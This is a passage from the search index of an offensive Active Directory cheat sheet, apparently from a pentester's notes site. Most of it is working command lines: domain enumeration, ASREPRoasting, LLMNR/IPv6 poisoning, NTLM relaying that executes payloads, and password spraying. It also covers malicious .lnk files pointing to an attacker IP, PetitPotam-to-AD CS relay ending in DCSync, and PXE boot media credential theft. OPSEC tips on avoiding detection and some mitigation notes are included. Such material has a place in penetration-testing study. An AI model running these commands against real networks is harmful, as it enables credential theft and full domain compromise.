<pre><code>net view\n</code></pre> <pre><code>net view /all /domain[:domainname]\n</code></pre> <pre><code>Shares on the domains\n</code></pre> <pre><code>net view /domain \n</code></pre></p> <p>OPSEC</p> <p>Typing <code>net1</code> instead of <code>net</code> will execute the same functions without the potential trigger from the net string.</p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#dsquery","title":"Dsquery","text":"<pre><code>C:\\Windows\\System32\\dsquery.dll\n</code></pre> <p>note</p> <p>Elevated privs required for dsquery</p> <p><pre><code>dsquery user\n</code></pre> <pre><code>dsquery computer\n</code></pre> We can use a dsquery wildcard search to view all objects in an OU, for example. <pre><code>dsquery * \"CN=Users,DC=DOMAIN,DC=LOCAL\"\n</code></pre> <pre><code>dsquery * -filter \"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl\n</code></pre> <pre><code>dsquery * -filter \"(userAccountControl:1.2.840.113556.1.4.803:=8192)\" -limit 5 -attr sAMAccountName\n</code></pre></p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Password%20Policy%20Enumeration/","title":"Password Policy Enumeration","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Password%20Policy%20Enumeration/#from-linux","title":"From Linux","text":"<p><pre><code>nxc smb 172.16.5.5 -u &lt;user&gt; -p password&gt; --pass-pol\n</code></pre> <pre><code>rpcclient -U \"\" -N &lt;target-ip&gt;\nrpcclient -U \"username\" &lt;target-ip&gt;\nrpcclient $&gt; querydominfo\n</code></pre> <pre><code>enum4linux -P &lt;target-ip&gt;\n</code></pre> <pre><code>ldeep ldap -u 'USER' -p \"PASS' -d 'domain.local' -s $IP domain_policy\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Password%20Policy%20Enumeration/#from-windows","title":"From Windows","text":"<p><pre><code>net accounts\n</code></pre> PowerView <pre><code>Get-DomainPolicy\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/SMB/","title":"SMB","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/SMB/#share-enumeration","title":"Share Enumeration","text":"<p><pre><code>nxc smb &lt;ip&gt; -u '' -p '' --shares\n</code></pre> <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M spider_plus --share 'sharename'\n</code></pre> <pre><code>smbmap -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; -H &lt;ip&gt;\n</code></pre> <pre><code>smbmap -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; -H &lt;ip&gt; -R 'sharename' --dir-only\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/ASREPRoast/","title":"ASREPRoast","text":"","tags":["Initial-Access","Kerberos","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/ASREPRoast/#identify","title":"Identify","text":"<p>NXC (remotely) <pre><code>nxc ldap &lt;IP&gt; -u '' -p '' --query '(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \"\"\n</code></pre> Locally: ADSearch Github <pre><code>ADSearch.exe --search \"(&amp;(objectCategory=user)(servicePrincipalName=*))\" --attributes cn,servicePrincipalName,samAccountName\n</code></pre> Locally: lolbin <pre><code>dsquery * -filter \"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl\n</code></pre> Locally: powerview <pre><code>Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontro\n</code></pre></p>","tags":["Initial-Access","Kerberos","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/ASREPRoast/#exploit","title":"Exploit","text":"<p>Ask for TGS  remotely: <pre><code>nxc ldap &lt;IP&gt; -u '&lt;USER&gt;' -p '' --asreproast output.txt\n</code></pre> <pre><code>impacket-GetNPUsers domain.local/svc-test -no-pass\n</code></pre> locally: <pre><code>Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt /user:svc-test /nowrap\n</code></pre> <pre><code>Get-ASREPHash -Username svc-test -verbose\n</code></pre></p> <p>Crack ticket <pre><code>hashcat -m 18200 --force -a 0 hashes.txt &lt;wordlist&gt;\n</code></pre> <pre><code>john --wordlist=&lt;wordlist&gt; hashes.txt\n</code></pre></p>","tags":["Initial-Access","Kerberos","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/IPv6%20Attacks/","title":"IPv6 Attacks","text":"<p>IPv6 has been adopted slowly and thus underutilized in environments. If IPv6 name resolution is enabled, but a proper DNS server has not been setup to respond to queries, we can man-in-the-middle by using Web Proxy Auto-Discovery Protocol (WPAD) resolution requests to capture and relay hashes to the DC.</p> <p> this attack is most consistently triggered on machine reboot or network stack reload so early mornings are probably the best time to perform this attack</p>","tags":["Initial-Access","MITM6","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/IPv6%20Attacks/#mitm6-ntlmrelayx","title":"mitm6 + ntlmrelayx","text":"<p>Start mitm6 <pre><code>sudo mitm6 -d domain.local\n</code></pre> Now start ntlmrelayx, specify a relay target (DC prolly) will output ldapdomaindump as HTML as well.  <pre><code>impacket-ntlmrelayx -6 -t ldaps://&lt;DCIP&gt; -wh wpad.domain.local -l lootme\n</code></pre> These options instruct ntlmrelayx to do an ldapdomaindump if user hashes are relayed, and create an account with DCSync privileges if a domain admins hash is relayed.</p>","tags":["Initial-Access","MITM6","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/LLMNR%20Poisoning/","title":"LLMNR Poisoning","text":"","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/LLMNR%20Poisoning/#from-linux","title":"From Linux","text":"<p>https://github.com/SpiderLabs/Responder <pre><code>sudo responder -I eth0 \n</code></pre> Wait for hashes to come in Crack them with <pre><code>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre></p>","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/LLMNR%20Poisoning/#from-windows","title":"From Windows","text":"","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/LLMNR%20Poisoning/#using-inveigh","title":"Using Inveigh","text":"<p>https://github.com/Kevin-Robertson/Inveigh <pre><code>Import-Module .\\Inveigh.ps1\n</code></pre> <pre><code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y\n</code></pre></p>","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/LLMNR%20Poisoning/#c-inveigh-inveighzero","title":"C# Inveigh (InveighZero)","text":"<p><pre><code>.\\Inveigh.exe\n</code></pre> We can quickly view unique captured hashes by typing <code>GET NTLMV2UNIQUE</code>. We can type in <code>GET NTLMV2USERNAMES</code> and see which usernames we have collected. This is helpful if we want a listing of users to perform additional enumeration against and see which are worth attempting to crack offline using Hashcat.</p>","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/LLMNR%20Poisoning/#abuse","title":"Abuse","text":"<p>Once you receive a response:</p> <p>you can either crack the Net-NTLMv2 hash</p> <ul> <li>See: Hash Cracking</li> </ul> <p>Or relay the to authenticate to a service</p> <ul> <li>See: Relay Attacks</li> </ul>","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/LLMNR%20Poisoning/#mitigation","title":"Mitigation","text":"<ol> <li>Select \"Turn OFF multicast Name Resolution\" under Local Computer Policy &gt; Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client in the Group Policy Editor</li> <li>Disable NBT-NS navigate to Network Connections &gt; Network Adapter Properties &gt; TCP/IPv4 Properties &gt; Advanced tab &gt; WINS tab and select \"Disable NetBios over TCP/IP\".  If you cannot disable for whatever reason</li> <li>Require Network Access Control (NAC)</li> <li>Require strong passwords: over 14 characters with capitals and symbols and no common words. The better the password, the longer it takes an attacker to crack the hash</li> </ol>","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/NTLM%20Theft%20Files/","title":"NTLM Theft Files","text":"<p>Any writable directory (shares, nfs, locally) where users will list contents you can use certain file types to steal hashes</p> <p>Manual: (.lnk)</p> <pre><code>$objShell = New-Object -ComObject WScript.Shell\n$lnk = $objShell.CreateShortcut(\"\\\\DC01.domain.local\\OpenShare\\IT-Driver.lnk\")\n$lnk.TargetPath = \"\\\\&lt;AttackerIP&gt;\\@ico.png\"\n$lnk.WindowStyle = 1\n$lnk.IconLocation = \"%windir%\\system32\\shell32.dll, 3\"\n$lnk.Description = \"IT Driver\"\n$lnk.HotKey = \"Ctrl+Alt+O\"\n$lnk.Save()\n</code></pre> <p>Automated (multi-type):</p> <p>https://github.com/Greenwolf/ntlm_theft</p> <p>Generate all file types:</p> <pre><code>python3 ntlm_theft.py -g all -s &lt;attackerIP&gt; -f '@myfile'\n</code></pre> <p>Monitor for traffic with Responder on linux or Inveigh on windows.  Hash received? Try to crack it <pre><code>hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt\n</code></pre></p> <p>OR:  Relay Attacks</p>","tags":["Initial-Access","Lateral-Movement","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/NetNTLM%20Hash%20Stealing/","title":"NetNTLM Hash Stealing","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/NetNTLM%20Hash%20Stealing/#poisoning","title":"Poisoning","text":"<ul> <li>LLMNR Poisoning</li> <li>IPv6 Attacks</li> </ul>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/NetNTLM%20Hash%20Stealing/#relaying","title":"Relaying","text":"<ul> <li>Relay Attacks</li> </ul>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/NetNTLM%20Hash%20Stealing/#misc-locations","title":"Misc Locations","text":"<ul> <li>https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/</li> </ul>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Password%20Stuff/","title":"Password Stuff","text":"<p>note</p> <p>It is worth targeting high-value hosts such as <code>SQL</code> or <code>Microsoft Exchange</code> servers, as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory.</p>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Password%20Stuff/#wordlist-generation","title":"Wordlist Generation","text":"<p>Add likely words to a file (domain name, seasons, employees, etc). Use hashcat with ruleset to generate the alterations <pre><code>hashcat --force words.txt -r /usr/share/hashcat/rules/best64.rule --stdout &gt; wordlist.txt\n</code></pre> you should also prolly append an exclamation point to the words as well.</p>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Password%20Stuff/#password-spraying","title":"Password Spraying","text":"","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Password%20Stuff/#from-linux","title":"From Linux","text":"<p><pre><code>for u in $(cat valid_users.txt);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 | grep Authority; done\n</code></pre> <pre><code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1\n</code></pre> <pre><code>nxc smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +\n</code></pre> <pre><code>nxc smb 172.16.5.5 -u avazquez -p Password123\n</code></pre> Spray local admin hash around domain <pre><code>nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +\n</code></pre></p> <p>note</p> <p>The <code>--local-auth</code> flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. <code>Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain</code></p> <p>From Windows https://github.com/dafthack/DomainPasswordSpray If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out. <pre><code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n</code></pre> <pre><code>Invoke-DomainPasswordSpray -UserList users.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n</code></pre></p>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Password%20Stuff/#external-password-spraying","title":"External Password Spraying","text":"<ul> <li>Microsoft 0365</li> <li>Outlook Web Exchange</li> <li>Exchange Web Access</li> <li>Skype for Business</li> <li>Lync Server</li> <li>Microsoft Remote Desktop Services (RDS) Portals</li> <li>Citrix portals using AD authentication</li> <li>VDI implementations using AD authentication such as VMware Horizon</li> <li>VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)</li> <li>Custom web applications that use AD authentication</li> </ul>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Password%20Stuff/#workarounds","title":"Workarounds","text":"<p>\u201cPassword must be changed on next logon\u201d \u201cPassword_must_change\u201d You can try two things <pre><code>rpcclient -U &lt;user&gt; &lt;IP&gt;\nrpcclient $&gt; setuserinfo2 &lt;user&gt; 23 'Password123!'\n</code></pre> <pre><code>smbpasswd -U &lt;user&gt; -r &lt;IP&gt;\n</code></pre></p>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Password%20Stuff/#password-in-description-field","title":"Password in Description Field","text":"<p>Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.</p> <p>Remote <pre><code>nxc ldap &lt;hostname&gt; -u &lt;user&gt; -p &lt;pass&gt; -M get-desc-users\n</code></pre> Local <pre><code>Import-Module powerview.ps1\nGet-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}\n</code></pre></p>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Password%20Stuff/#passwords-in-files","title":"Passwords in files","text":"<pre><code>findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml\n</code></pre>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/PetitPotam%20%28MS-EFSRPC%29/","title":"PetitPotam (MS EFSRPC)","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/PetitPotam%20%28MS-EFSRPC%29/#attack-requirements","title":"Attack requirements","text":"Feature / Component Required for PetitPotam Required for Full Relay to DA via AD CS EFSRPC \u2705 Yes \u2705 Yes NTLM Enabled \u2705 Yes \u2705 Yes SMB/LDAP Signing Disabled \u2705 Yes (on relay target) \u2705 Yes (on certsrv or LDAP) AD CS Installed \u274c No \u2705 Yes Vulnerable AD CS Template \u274c No \u2705 Yes EPA / Channel Binding Off \u274c No \u2705 Yes","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/PetitPotam%20%28MS-EFSRPC%29/#identify","title":"Identify","text":"<p><pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M coerce_plus -o METHOD=PetitPotam\n</code></pre> shorthand <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M coerce_plus -o M=pe\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/PetitPotam%20%28MS-EFSRPC%29/#exploit","title":"Exploit","text":"<p>https://github.com/topotam/PetitPotam https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1 </p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/PetitPotam%20%28MS-EFSRPC%29/#start-ntlmrelayx","title":"Start ntlmrelayx","text":"<p><pre><code>sudo ntlmrelayx.py -debug -smb2support --target http://CA01.domain.local/certsrv/certfnsh.asp --adcs --template DomainController\n</code></pre> At the same time try to coerce DC to auth <pre><code>python3 PetitPotam.py &lt;attackerIP&gt; &lt;DCIP&gt;\n</code></pre> OR coerce with nxc <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M coerce_plus -o LISTENER=&lt;AttackerIP&gt; M=pe\n</code></pre></p> <p>You should receive a base64 encoded certificate in ntlmrelayx output Next, we can take this base64 certificate and use <code>gettgtpkinit.py</code> to request a Ticket-Granting-Ticket (TGT) for the domain controller. https://github.com/dirkjanm/PKINITtools.git <pre><code>python3 gettgtpkinit.py DOMAIN.LOCAL/DC01\\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache\n</code></pre> Set krb env variable <pre><code>export KRB5CCNAME=dc01.ccache\n</code></pre> Attempt DCSync <pre><code>impacket-secretsdump -just-dc-user DOMAIN/administrator -k -no-pass \"DC01$\"@DC01.DOMAIN.LOCAL\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/","title":"Pre Boot Execution Environment PXE","text":"","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#technique","title":"Technique","text":"<p>This technique provides initial access by exploiting the Pre-Boot Execution Environment (PXE), a standard for booting computers over the network. In corporate environments, PXE is commonly used by System Center Configuration Manager (SCCM) to deploy operating systems.</p> <p>An attacker on the local network can masquerade as a new computer requesting a boot image. By capturing the SCCM boot media files, the attacker can perform an offline password cracking attack to decrypt them. A successful decryption reveals sensitive information, most notably the credentials for the Network Access Account (NAA) or domain join accounts, which can be used for initial access and privilege escalation within the Active Directory domain.</p> <p>note</p> <p>The presence of PXE is a common indicator that SCCM is being used as well, but not always</p>","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#prerequisites","title":"Prerequisites","text":"<p>Access Level: An attacker needs to be on the same local network (broadcast domain) as the SCCM PXE-enabled Distribution Point. No prior domain credentials are required.</p> <p>System State:</p> <ul> <li> <p>A PXE-enabled SCCM Distribution Point must be accessible on the network.</p> </li> <li> <p>The attacker's machine must be a Windows system to run the required tool, <code>PXEThief</code>.</p> </li> <li> <p>The attacker's machine must be seen as an \"Unknown Computer\" by SCCM.</p> </li> <li> <p>A <code>tftp</code> client is required to download boot files.</p> </li> <li> <p><code>hashcat</code> and a custom SCCM hashcat module are needed for password cracking.</p> </li> </ul> <p>Information: The IP address of the SCCM Distribution Point (DP) is helpful, though it can sometimes be discovered.</p>","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#considerations","title":"Considerations","text":"<p>Impact</p> <p>A successful attack grants the attacker highly valuable credentials. The Network Access Account and Domain Join Account often have permissions to read from most Active Directory objects and write to computer objects, providing a significant foothold for lateral movement and further exploitation.</p> <p>OPSEC</p> <ul> <li> <p>Initial PXE/DHCP requests are broadcast traffic and may not appear suspicious.</p> </li> <li> <p>The <code>tftp</code> file transfer is unencrypted and could be flagged by network monitoring.</p> </li> <li> <p>Subsequent authenticated requests to the SCCM Management Point (MP) originate from an attacker-controlled, unmanaged device, which could be an indicator of compromise if client origins are monitored.</p> </li> </ul>","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#identify","title":"Identify","text":"<p>The primary method for identifying a vulnerable PXE server is to use the <code>PXEThief</code> tool. While it has a discovery option, directly targeting a known or suspected SCCM server IP address is more reliable. https://github.com/MWR-CyberSec/PXEThief</p> <p>note</p> <p>PXEThief  should only be used on windows due to the pywin32 dependency, it also works best with python 3.10 </p> <p><pre><code>python pxethief.py 2 &lt;DISTRIBUTION_POINT_IP&gt;\n</code></pre> A successful response will provide the file paths for the .boot.var and .boot.bcd files on the server's TFTP share.</p>","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#execution","title":"Execution","text":"<p>Step 1: Request Boot Media Paths</p> <p>Use PXEThief to coerce the DP into providing the location of the encrypted boot media files.</p> <pre><code>python pxethief.py 2 &lt;IP&gt;\n</code></pre> <p>This will output the full paths to the <code>.boot.var</code> and <code>.boot.bcd</code> files.</p> <p>Step 2: Download the Encrypted Boot Variable File</p> <p>Use the <code>tftp</code> client to download the <code>.boot.var</code> file from the Distribution Point.</p> <pre><code>tftp -i &lt;DISTRIBUTION_POINT_IP&gt; GET \"\\\\SMSTemp\\\\&lt;...&gt;.boot.var\" \"&lt;...&gt;.boot.var\"\n</code></pre> <p>Step 3: Extract the Hash for Cracking</p> <p>Use <code>PXEThief</code> with option 5 to process the downloaded <code>.boot.var</code> file and generate a crackable hash.</p> <pre><code>python pxethief.py 5 '.\\\\&lt;...&gt;.boot.var'\n</code></pre> <p>A specific hashcat module must be used to crack the hash. Here is how to install it:</p> <pre><code>cd hashcat_pxe/\ngit clone https://github.com/hashcat/hashcat.git\ngit clone https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module\ncp configmgr-cryptderivekey-hashcat-module/module_code/module_19850.c hashcat/src/modules/\ncp configmgr-cryptderivekey-hashcat-module/opencl_code/m19850\\* hashcat/OpenCL/\ncd hashcat\ngit checkout -b v6.2.5 tags/v6.2.5 # change to 6.2.5\nmake\n</code></pre> <p>Then, the hash can be cracked with hashcat's module <code>19850</code> and a password wordlist:</p> <pre><code>hashcat/hashcat -m 19850 --force -a 0 hashcat/hash /usr/share/wordlists/rockyou.txt\n</code></pre> <p>Step 5: Decrypt Media and Extract Credentials</p> <p>Use <code>PXEThief</code> with option 3, providing the downloaded <code>.boot.var</code> file and the cracked password to decrypt the contents and automatically extract credentials.</p> <pre><code>python pxethief.py 3 '.\\\\&lt;...&gt;.boot.var' \"Password123!\"\n</code></pre> <p>The tool will parse the decrypted data and display any found usernames and passwords for accounts like the NAA.</p>","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li> <p>Delete all downloaded artifacts from the attack machine, including the <code>.boot.var</code>, <code>.boot.bcd</code>, <code>variables.xml</code>, and the exported <code>.pfx</code> certificate file.</p> </li> <li> <p>Remove the client certificate imported by <code>PXEThief</code> from the Windows Certificate Store.</p> </li> </ul>","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#detection","title":"Detection","text":"<ul> <li> <p>Network Monitoring: Monitor for unusual <code>tftp</code> traffic or a high volume of PXE boot requests from a single source.</p> </li> <li> <p>Log Analysis: Audit SCCM and domain controller logs for authentication events tied to the Network Access Account originating from unexpected or unmanaged IP addresses.</p> </li> <li> <p>Endpoint Monitoring: Look for the execution of <code>PXEThief.py</code> or <code>tftp.exe</code> on non-administrative workstations.</p> </li> </ul>","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#mitigation","title":"Mitigation","text":"<ul> <li> <p>Strong Passwords: Protect the PXE boot media with a strong, complex, and long password. This makes offline cracking significantly more difficult and time-consuming.</p> </li> <li> <p>Least Privilege: Strictly enforce the principle of least privilege for the Network Access Account and any domain join accounts. They should have the absolute minimum permissions required to function.</p> </li> <li> <p>Network Segmentation: Use VLANs and firewall rules to restrict which network segments can communicate with SCCM Distribution Points on required ports (e.g., DHCP, TFTP).</p> </li> <li> <p>Regular Audits: Regularly audit and rotate the credentials used for PXE boot and within Task Sequences.</p> </li> </ul>","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Relay%20Attacks/","title":"Relay Attacks","text":"<p>https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/</p> <p>Relay captures hashes to target machine for various types of access. - Only works if SMB signing is disabled or \"not required\" - Relayed creds MUST be admin on the machine</p>","tags":["Initial-Access","LLMNR","NETBIOS","SMB","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Relay%20Attacks/#identifying-relay-targets","title":"Identifying Relay Targets","text":"<p>Automated</p> <p>RunFinger.py included with Responder can scan the network for potential relay targets for:</p> <ul> <li>SMB</li> <li>MSSQL</li> <li>RDP</li> </ul> <pre><code>python3 RunFinger.py -i 192.168.1.0/24\n</code></pre> <p>NetExec will automatically generate a list of targets with --gen-relay-list for:</p> <ul> <li>SMB</li> </ul> <pre><code>nxc smb 192.168.1.0/24 --gen-relay-list output.txt\n</code></pre>","tags":["Initial-Access","LLMNR","NETBIOS","SMB","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Relay%20Attacks/#ntlmrelayx","title":"ntlmrelayx","text":"","tags":["Initial-Access","LLMNR","NETBIOS","SMB","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/Relay%20Attacks/#responder-ntlmrelayx","title":"Responder + ntlmrelayx","text":"<p>Edit responder conf: <pre><code>sudo nano /etc/responder/Responder.conf\nSMB = On ---&gt; Off\nHTTP = on ---&gt; Off\n</code></pre> Make targets list <pre><code>echo \"&lt;TargetIP&gt;\" &gt; targets.txt\n</code></pre> Run responder <pre><code>sudo responder -I eth0 -wv\n</code></pre> Start ntlmrelayx with any of these options</p> <p>Dump hashes <pre><code>sudo impacket-ntlmrelayx -tf targets.txt -smb2support\n</code></pre> Get semi-interactive smbexec bind shell (<code>nc localhost 11000</code>) <pre><code>sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i\n</code></pre> Execute payload <pre><code>sudo impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe\n</code></pre> Execute Command <pre><code>sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'\n</code></pre> Wait for auth attempt (or coerce auth 